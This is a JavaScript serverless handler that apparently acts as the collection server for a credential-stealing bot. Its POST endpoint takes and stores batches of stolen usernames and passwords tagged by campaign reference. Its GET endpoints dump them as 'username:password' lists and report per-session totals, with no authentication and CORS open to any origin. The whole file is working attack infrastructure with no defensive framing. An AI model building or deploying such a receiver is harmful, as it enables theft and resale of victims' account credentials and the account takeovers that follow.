// In-memory store (persists while Vercel keeps function warm)
// Each deployment gets fresh store
const store = {};

export default function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  // POST - receive creds from bot
  if (req.method === 'POST') {
    try {
      const { ref, creds, ok: batchOk, fail: batchFail, total } = req.body || {};
      const r = ref || 'unknown';
      const ts = new Date().toISOString();

      if (!store[r]) store[r] = { creds: [], batches: 0, started: ts };

      const existing = new Set(store[r].creds.map(c => c.u));
      let added = 0;
      for (const c of (creds || [])) {
        const u = c.username || c.u;
        const p = c.password || c.p;
        const rid = c.ref || c.rid || r;
        if (u && !existing.has(u)) {
          store[r].creds.push({ u, p, rid, t: ts });
          existing.add(u);
          added++;
        }
      }
      store[r].batches++;
      store[r].lastUpdate = ts;

      return res.json({ ok: true, added, total: store[r].creds.length });
    } catch (e) {
      return res.status(500).json({ error: e.message });
    }
  }

  // GET - view creds
  if (req.method === 'GET') {
    const ref = req.query.ref;
    const fmt = req.query.format;

    if (ref && store[ref]) {
      const s = store[ref];
      if (fmt === 'txt') {
        res.setHeader('Content-Type', 'text/plain');
        const lines = s.creds.map((c, i) => `${c.u}:${c.p}`).join('\n');
        return res.send(`# Ref: ${ref} | Total: ${s.creds.length}\n${lines}`);
      }
      return res.json({ ok: true, ref, total: s.creds.length, batches: s.batches, lastUpdate: s.lastUpdate, creds: s.creds });
    }

    // Summary
    const summary = {};
    let totalAll = 0;
    for (const [r, s] of Object.entries(store)) {
      summary[r] = { total: s.creds.length, batches: s.batches, lastUpdate: s.lastUpdate };
      totalAll += s.creds.length;
    }
    return res.json({ ok: true, totalCreds: totalAll, sessions: summary });
  }

  return res.status(405).json({ error: 'Method not allowed' });
}
